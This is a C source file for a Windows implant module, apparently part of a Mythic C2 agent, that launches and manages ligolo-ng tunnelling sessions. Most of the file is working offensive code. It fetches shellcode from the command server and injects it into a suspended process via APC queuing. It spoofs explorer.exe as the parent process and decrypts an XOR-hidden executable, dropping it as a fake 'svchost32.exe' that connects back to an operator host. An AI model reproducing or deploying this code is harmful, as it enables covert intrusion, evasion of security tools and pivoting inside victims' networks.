#define _WIN32_WINNT 0x0601
#include "commands.h"
#include "utils.h"
#ifdef EVASION_SYSCALLS
#include "evasion.h"
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
#endif
#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    0x00020000
#endif

#define LIGOLO_CHUNK_SIZE (4 * 1024 * 1024)

#if defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_LIGOLO_STOP) || defined(INCLUDE_CMD_LIGOLO_STATUS)

#ifdef EMBEDDED_LIGOLO
#include "embedded_ligolo.h"
#endif

typedef struct LigoloSession {
    HANDLE              hProcess;
    DWORD               pid;
    char                remote_path[512];
    char                connect[256];
    struct LigoloSession *next;
} LigoloSession;

static LigoloSession *g_sessions = NULL;

static int ligolo_extract_int(const char *json, const char *key, int defval) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *kp = strstr(json, pat);
    if (!kp) return defval;
    const char *vp = strchr(kp, ':');
    if (!vp) return defval;
    while (*++vp == ' ' || *vp == '\t');
    return atoi(vp);
}

static char *ligolo_extract_b64(const char *json, const char *key) {
    char pat[72];
    snprintf(pat, sizeof(pat), "\"%s\":\"", key);
    const char *start = strstr(json, pat);
    if (!start) return NULL;
    start += strlen(pat);
    const char *end = strchr(start, '"');
    if (!end) return NULL;
    size_t len = (size_t)(end - start);
    char *result = (char *)malloc(len + 1);
    if (!result) return NULL;
    memcpy(result, start, len);
    result[len] = '\0';
    return result;
}

static int ligolo_json_bool(const char *json, const char *key, int def) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) return def;
    p = strchr(p, ':');
    if (!p) return def;
    while (*++p == ' ');
    if (strncmp(p, "true",  4) == 0) return 1;
    if (strncmp(p, "false", 5) == 0) return 0;
    return def;
}

static int session_alive(LigoloSession *s) {
    if (!s || s->hProcess == INVALID_HANDLE_VALUE) return 0;
    return WaitForSingleObject(s->hProcess, 0) == WAIT_TIMEOUT;
}

static void session_free(LigoloSession *s) {
    if (s->hProcess != INVALID_HANDLE_VALUE)
        CloseHandle(s->hProcess);
    free(s);
}

static void purge_dead(void) {
    LigoloSession **pp = &g_sessions;
    while (*pp) {
        if (!session_alive(*pp)) {
            LigoloSession *dead = *pp;
            *pp = dead->next;
            session_free(dead);
        } else {
            pp = &(*pp)->next;
        }
    }
}

static void ligolo_impl(char *task_id, char *params, const char *action) {

    /* --- STATUS --- */
    if (strcmp(action, "status") == 0) {
        purge_dead();

        char  *json = NULL;
        size_t cap  = 256;
        size_t pos  = 0;
        json = malloc(cap);
        if (!json) { send_task_response(task_id, "Error: out of memory"); return; }
        pos += snprintf(json + pos, cap - pos, "[");

        int first = 1;
        for (LigoloSession *s = g_sessions; s; s = s->next) {
            char esc_path[1024] = {0};
            int  ep = 0;
            for (const char *p = s->remote_path; *p && ep < (int)sizeof(esc_path) - 2; p++) {
                if (*p == '\\') esc_path[ep++] = '\\';
                esc_path[ep++] = *p;
            }
            /* grow buffer if needed */
            size_t needed = pos + strlen(esc_path) + strlen(s->connect) + 128;
            if (needed > cap) {
                cap = needed * 2;
                char *tmp = realloc(json, cap);
                if (!tmp) { free(json); send_task_response(task_id, "Error: out of memory"); return; }
                json = tmp;
            }
            pos += snprintf(json + pos, cap - pos,
                "%s{\"pid\":%lu,\"status\":\"running\",\"connect\":\"%s\",\"path\":\"%s\"}",
                first ? "" : ",",
                s->pid, s->connect, esc_path);
            first = 0;
        }

        if (pos + 2 > cap) {
            char *tmp = realloc(json, cap + 2);
            if (!tmp) { free(json); send_task_response(task_id, "Error: out of memory"); return; }
            json = tmp;
        }
        json[pos++] = ']';
        json[pos]   = '\0';
        send_task_response(task_id, json);
        free(json);
        return;
    }

    /* --- STOP --- */
    if (strcmp(action, "stop") == 0) {
        char remote_path[512] = {0};
        extract_json_string(params, "remote_path", remote_path, sizeof(remote_path));

        int killed = 0;
        LigoloSession **pp = &g_sessions;
        while (*pp) {
            if (remote_path[0] == '\0' ||
                strcmp((*pp)->remote_path, remote_path) == 0) {
                LigoloSession *dead = *pp;
                *pp = dead->next;
                TerminateProcess(dead->hProcess, 0);
                session_free(dead);
                killed++;
            } else {
                pp = &(*pp)->next;
            }
        }
        char msg[64];
        snprintf(msg, sizeof(msg), killed ? "%d session(s) terminated." : "No matching session found.", killed);
        send_task_response(task_id, msg);
        return;
    }

    /* --- START --- */
    char connect[256]            = {0};
    char remote_path[512]        = "C:\\Windows\\Temp\\svchost32.exe";
    char accept_fingerprint[128] = {0};
    char bind_addr[256]          = {0};
    char proxy_url[512]          = {0};
    char user_agent[512]         = {0};
    char shellcode_file_id[128]  = {0};
    char ligolo_args[1024]       = {0};
    int  sc_chunk_size           = LIGOLO_CHUNK_SIZE;
    int  ignore_cert             = 1;
    int  retry                   = 1;
    int  verbose                 = 0;

    extract_json_string(params, "connect",            connect,            sizeof(connect));
    extract_json_string(params, "remote_path",        remote_path,        sizeof(remote_path));
    extract_json_string(params, "accept_fingerprint", accept_fingerprint, sizeof(accept_fingerprint));
    extract_json_string(params, "bind",               bind_addr,          sizeof(bind_addr));
    extract_json_string(params, "proxy",              proxy_url,          sizeof(proxy_url));
    extract_json_string(params, "user_agent",         user_agent,         sizeof(user_agent));
    extract_json_string(params, "shellcode_file_id",  shellcode_file_id,  sizeof(shellcode_file_id));
    extract_json_string(params, "ligolo_args",        ligolo_args,        sizeof(ligolo_args));
    {
        int v = ligolo_extract_int(params, "sc_chunk_size", 0);
        if (v > 0) sc_chunk_size = v;
    }
    ignore_cert = ligolo_json_bool(params, "ignore_cert", 1);
    retry       = ligolo_json_bool(params, "retry",       1);
    verbose     = ligolo_json_bool(params, "verbose",     0);

    if (connect[0] == '\0' && bind_addr[0] == '\0') {
        send_task_response(task_id, "Error: -connect or -bind is required");
        return;
    }

    /* --- FORK+RUN PATH --- */
    if (shellcode_file_id[0]) {
        /* Download Donut shellcode from Mythic in chunks (args already baked in by Python) */
        unsigned char *shellcode     = NULL;
        size_t         shellcode_len = 0;
        int            total_chunks  = -1;
        int            chunk_num     = 1;

        while (1) {
            char json_msg[2048];
            if (chunk_num == 1 || total_chunks <= 0) {
                snprintf(json_msg, sizeof(json_msg),
                    "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
                    "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
                    "\"chunk_num\":%d,\"full_path\":\"<ligolo_fork_run>\"}}]}",
                    task_id, sc_chunk_size, shellcode_file_id, chunk_num);
            } else {
                snprintf(json_msg, sizeof(json_msg),
                    "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
                    "\"status\":\"Downloading shellcode: chunk %d / %d\","
                    "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
                    "\"chunk_num\":%d,\"full_path\":\"<ligolo_fork_run>\"}}]}",
                    task_id, chunk_num, total_chunks,
                    sc_chunk_size, shellcode_file_id, chunk_num);
            }

            char *b64_resp = send_c2_message(json_msg);
            if (!b64_resp) { free(shellcode); send_task_response(task_id, "Error: C2 unreachable"); return; }

            char *json_resp = process_mythic_response(b64_resp, strlen(b64_resp));
            free(b64_resp);
            if (!json_resp) { free(shellcode); send_task_response(task_id, "Error: decrypt failed"); return; }

            if (chunk_num == 1) {
                total_chunks = ligolo_extract_int(json_resp, "total_chunks", -1);
                if (total_chunks <= 0) {
                    free(json_resp); free(shellcode);
                    send_task_response(task_id, "Error: failed to retrieve shellcode");
                    return;
                }
            }

            char *b64_chunk = ligolo_extract_b64(json_resp, "chunk_data");
            free(json_resp);
            if (!b64_chunk) { free(shellcode); send_task_response(task_id, "Error: missing chunk_data"); return; }

            size_t         decoded_len = 0;
            unsigned char *decoded     = base64_decode_bin(b64_chunk, strlen(b64_chunk), &decoded_len);
            free(b64_chunk);

            if (decoded && decoded_len > 0) {
                unsigned char *tmp = realloc(shellcode, shellcode_len + decoded_len);
                if (!tmp) { free(decoded); free(shellcode); send_task_response(task_id, "Error: out of memory"); return; }
                shellcode = tmp;
                memcpy(shellcode + shellcode_len, decoded, decoded_len);
                shellcode_len += decoded_len;
                free(decoded);
            }

            if (chunk_num >= total_chunks) break;
            chunk_num++;
        }

        if (!shellcode || shellcode_len == 0) {
            free(shellcode);
            send_task_response(task_id, "Error: empty shellcode");
            return;
        }

        /* Resolve host process path via SearchPathW (uses g_spawnto_path from spawnto command) */
        wchar_t whost_name[512] = {0};
        MultiByteToWideChar(CP_UTF8, 0, g_spawnto_path, -1, whost_name, 512);
        wchar_t whost_full[512] = {0};
        if (!strchr(g_spawnto_path, '\\') && !strchr(g_spawnto_path, '/')) {
            DWORD ret = SearchPathW(NULL, whost_name, NULL, 512, whost_full, NULL);
            if (ret == 0 || ret >= 512) {
                SecureZeroMemory(shellcode, shellcode_len); free(shellcode);
                char emsg[600];
                snprintf(emsg, sizeof(emsg), "Error: '%s' not found in PATH", g_spawnto_path);
                send_task_response(task_id, emsg);
                return;
            }
        } else {
            wcsncpy(whost_full, whost_name, 511);
        }

        /* PPID spoof: explorer.exe */
        DWORD  spoof_pid2   = 0;
        HANDLE hParent2     = NULL;
        BOOL   use_spoof2   = FALSE;
        LPPROC_THREAD_ATTRIBUTE_LIST attr2 = NULL;
        {
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe2; pe2.dwSize = sizeof(pe2);
                if (Process32First(hSnap, &pe2)) do {
                    if (_stricmp(pe2.szExeFile, "explorer.exe") == 0 && !spoof_pid2)
                        spoof_pid2 = pe2.th32ProcessID;
                } while (Process32Next(hSnap, &pe2));
                CloseHandle(hSnap);
            }
        }
        if (spoof_pid2)
            hParent2 = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid2);
        if (hParent2) {
            SIZE_T attr_size2 = 0;
            InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size2);
            attr2 = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size2);
            if (attr2 && InitializeProcThreadAttributeList(attr2, 1, 0, &attr_size2)) {
                if (UpdateProcThreadAttribute(attr2, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                              &hParent2, sizeof(hParent2), NULL, NULL))
                    use_spoof2 = TRUE;
                else { DeleteProcThreadAttributeList(attr2); HeapFree(GetProcessHeap(), 0, attr2); attr2 = NULL; }
            } else {
                if (attr2) { HeapFree(GetProcessHeap(), 0, attr2); attr2 = NULL; }
            }
        }

        STARTUPINFOEXW siex2;
        ZeroMemory(&siex2, sizeof(siex2));
        siex2.StartupInfo.cb          = use_spoof2 ? (DWORD)sizeof(siex2) : (DWORD)sizeof(STARTUPINFOW);
        siex2.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
        siex2.StartupInfo.wShowWindow = SW_HIDE;
        if (use_spoof2) siex2.lpAttributeList = attr2;

        /* Build lpCommandLine: "{host_process_name} {ligolo_args}"
         * The process sees this via GetCommandLineW(); ligolo-ng parses argv[1:]
         * for its connection parameters (-connect, -ignore-cert, etc.). */
        char cmdline_buf[2048] = {0};
        snprintf(cmdline_buf, sizeof(cmdline_buf), "%s %s", g_spawnto_path, ligolo_args);
        wchar_t wcmdline[2048] = {0};
        MultiByteToWideChar(CP_UTF8, 0, cmdline_buf, -1, wcmdline, 2048);

        PROCESS_INFORMATION pi2;
        ZeroMemory(&pi2, sizeof(pi2));
        DWORD cflags2 = CREATE_SUSPENDED | CREATE_NO_WINDOW;
        if (use_spoof2) cflags2 |= EXTENDED_STARTUPINFO_PRESENT;

        BOOL ok2 = CreateProcessW(whost_full, wcmdline, NULL, NULL, FALSE,
                                  cflags2, NULL, NULL, &siex2.StartupInfo, &pi2);
        if (use_spoof2) { DeleteProcThreadAttributeList(attr2); HeapFree(GetProcessHeap(), 0, attr2); }
        if (hParent2) CloseHandle(hParent2);

        if (!ok2) {
            SecureZeroMemory(shellcode, shellcode_len); free(shellcode);
            char emsg[256];
            snprintf(emsg, sizeof(emsg), "Error: CreateProcess(%s) failed (%lu)", g_spawnto_path, GetLastError());
            send_task_response(task_id, emsg);
            return;
        }

        /* RW alloc -> write -> RX -> QueueUserAPC -> ResumeThread */
        LPVOID rmem = VirtualAllocEx(pi2.hProcess, NULL, shellcode_len,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!rmem) {
            TerminateProcess(pi2.hProcess, 0); CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
            SecureZeroMemory(shellcode, shellcode_len); free(shellcode);
            send_task_response(task_id, "Error: VirtualAllocEx failed");
            return;
        }

        SIZE_T written2 = 0;
        if (!WriteProcessMemory(pi2.hProcess, rmem, shellcode, shellcode_len, &written2)
                || written2 != shellcode_len) {
            VirtualFreeEx(pi2.hProcess, rmem, 0, MEM_RELEASE);
            TerminateProcess(pi2.hProcess, 0); CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
            SecureZeroMemory(shellcode, shellcode_len); free(shellcode);
            send_task_response(task_id, "Error: WriteProcessMemory failed");
            return;
        }
        SecureZeroMemory(shellcode, shellcode_len);
        free(shellcode);

        DWORD old_prot = 0;
        VirtualProtectEx(pi2.hProcess, rmem, shellcode_len, PAGE_EXECUTE_READ, &old_prot);

        if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)rmem, pi2.hThread, 0)) {
            VirtualFreeEx(pi2.hProcess, rmem, 0, MEM_RELEASE);
            TerminateProcess(pi2.hProcess, 0); CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
            char emsg[256];
            snprintf(emsg, sizeof(emsg), "Error: QueueUserAPC failed (%lu)", GetLastError());
            send_task_response(task_id, emsg);
            return;
        }
        ResumeThread(pi2.hThread);

        /* Track session using the host process handle */
        LigoloSession *s2 = calloc(1, sizeof(LigoloSession));
        if (!s2) {
            TerminateProcess(pi2.hProcess, 0); CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess);
            send_task_response(task_id, "Error: out of memory");
            return;
        }
        s2->hProcess = pi2.hProcess;
        s2->pid      = pi2.dwProcessId;
        WideCharToMultiByte(CP_UTF8, 0, whost_full, -1,
                            s2->remote_path, sizeof(s2->remote_path), NULL, NULL);
        strncpy(s2->connect, connect[0] ? connect : bind_addr, sizeof(s2->connect) - 1);
        s2->next    = g_sessions;
        g_sessions  = s2;
        CloseHandle(pi2.hThread);

        char msg2[512];
        snprintf(msg2, sizeof(msg2),
                 "Ligolo-ng fork+run: shellcode injected into %s (PID %lu)\nConnect: %s",
                 g_spawnto_path, pi2.dwProcessId, connect[0] ? connect : bind_addr);
        send_task_response(task_id, msg2);
        return;
    }

#ifdef EMBEDDED_LIGOLO
    /* Decrypt XOR-encrypted embedded PE and write to remote_path.
     * The PE needs to land on disk so CreateProcessW can pass CLI args
     * (-connect, -ignore-cert, etc.) at runtime. */
    {
        unsigned char *pe_data = (unsigned char *)malloc(g_ligolo_size);
        if (!pe_data) { send_task_response(task_id, "Error: out of memory"); return; }
        for (unsigned int _i = 0; _i < g_ligolo_size; _i++)
            pe_data[_i] = g_ligolo_data[_i] ^ g_ligolo_key[_i % g_ligolo_key_size];

        HANDLE hFile = CreateFileA(remote_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            SecureZeroMemory(pe_data, g_ligolo_size); free(pe_data);
            char emsg[256];
            snprintf(emsg, sizeof(emsg), "Error: write to %s failed (%lu)",
                     remote_path, GetLastError());
            send_task_response(task_id, emsg);
            return;
        }
        DWORD written = 0;
        WriteFile(hFile, pe_data, (DWORD)g_ligolo_size, &written, NULL);
        CloseHandle(hFile);
        SecureZeroMemory(pe_data, g_ligolo_size);
        free(pe_data);

        if (written != (DWORD)g_ligolo_size) {
            DeleteFileA(remote_path);
            send_task_response(task_id, "Error: write incomplete");
            return;
        }
    }
#endif

    /* Build command line (shared by embedded and non-embedded paths) */
    char cmdline[2048] = {0};
    int  pos = 0;
    pos += snprintf(cmdline + pos, sizeof(cmdline) - pos, "\"%s\"", remote_path);
    if (connect[0])            pos += snprintf(cmdline + pos, sizeof(cmdline) - pos, " -connect %s",             connect);
    if (bind_addr[0])          pos += snprintf(cmdline + pos, sizeof(cmdline) - pos, " -bind %s",                bind_addr);
    if (ignore_cert)           pos += snprintf(cmdline + pos, sizeof(cmdline) - pos, " -ignore-cert");
    if (retry)                 pos += snprintf(cmdline + pos, sizeof(cmdline) - pos, " -retry");
    if (verbose)               pos += snprintf(cmdline + pos, sizeof(cmdline) - pos, " -v");
    if (accept_fingerprint[0]) pos += snprintf(cmdline + pos, sizeof(cmdline) - pos, " -accept-fingerprint %s", accept_fingerprint);
    if (proxy_url[0])          pos += snprintf(cmdline + pos, sizeof(cmdline) - pos, " -proxy %s",              proxy_url);
    if (user_agent[0])         pos += snprintf(cmdline + pos, sizeof(cmdline) - pos, " -ua \"%s\"",             user_agent);
    (void)pos;

    wchar_t wcmd[2048] = {0};
    MultiByteToWideChar(CP_UTF8, 0, cmdline, -1, wcmd, 2048);

    /* PPID spoof: use explorer.exe as parent to blend into normal process tree */
    DWORD spoof_pid = 0;
    {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe2; pe2.dwSize = sizeof(pe2);
            if (Process32First(hSnap, &pe2)) do {
                if (_stricmp(pe2.szExeFile, "explorer.exe") == 0 && !spoof_pid)
                    spoof_pid = pe2.th32ProcessID;
            } while (Process32Next(hSnap, &pe2));
            CloseHandle(hSnap);
        }
    }
    HANDLE hParent = spoof_pid ? OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid) : NULL;

    SIZE_T attr_size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
    LPPROC_THREAD_ATTRIBUTE_LIST attr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
    if (!attr) {
        if (hParent) CloseHandle(hParent);
        send_task_response(task_id, "Error: HeapAlloc failed");
        return;
    }
    InitializeProcThreadAttributeList(attr, 1, 0, &attr_size);
    if (hParent)
        UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                  &hParent, sizeof(hParent), NULL, NULL);

    STARTUPINFOEXW siex;
    ZeroMemory(&siex, sizeof(siex));
    siex.StartupInfo.cb       = sizeof(siex);
    siex.StartupInfo.dwFlags  = STARTF_USESHOWWINDOW;
    siex.StartupInfo.wShowWindow = SW_HIDE;
    siex.lpAttributeList      = attr;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUPINFO_PRESENT,
                             NULL, NULL, &siex.StartupInfo, &pi);
    DeleteProcThreadAttributeList(attr);
    HeapFree(GetProcessHeap(), 0, attr);
    if (hParent) CloseHandle(hParent);

    if (!ok) {
        char msg[256];
        snprintf(msg, sizeof(msg), "Error: CreateProcess failed (%lu)", GetLastError());
        send_task_response(task_id, msg);
        return;
    }
    CloseHandle(pi.hThread);

    LigoloSession *s = calloc(1, sizeof(LigoloSession));
    if (!s) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess);
        send_task_response(task_id, "Error: out of memory");
        return;
    }
    s->hProcess = pi.hProcess;
    s->pid      = pi.dwProcessId;
    strncpy(s->remote_path, remote_path, sizeof(s->remote_path) - 1);
    strncpy(s->connect, connect[0] ? connect : bind_addr, sizeof(s->connect) - 1);
    s->next    = g_sessions;
    g_sessions = s;

    char msg[1024];
    snprintf(msg, sizeof(msg), "Ligolo-ng started: %s (PID %lu)\nConnect: %s",
             remote_path, pi.dwProcessId, connect[0] ? connect : bind_addr);
    send_task_response(task_id, msg);
}

#ifdef INCLUDE_CMD_LIGOLO_START
void command_ligolo_start(char *task_id, char *params) {
    ligolo_impl(task_id, params, "start");
}
#endif

#ifdef INCLUDE_CMD_LIGOLO_STOP
void command_ligolo_stop(char *task_id, char *params) {
    ligolo_impl(task_id, params, "stop");
}
#endif

#ifdef INCLUDE_CMD_LIGOLO_STATUS
void command_ligolo_status(char *task_id, char *params) {
    ligolo_impl(task_id, params, "status");
}
#endif

#endif
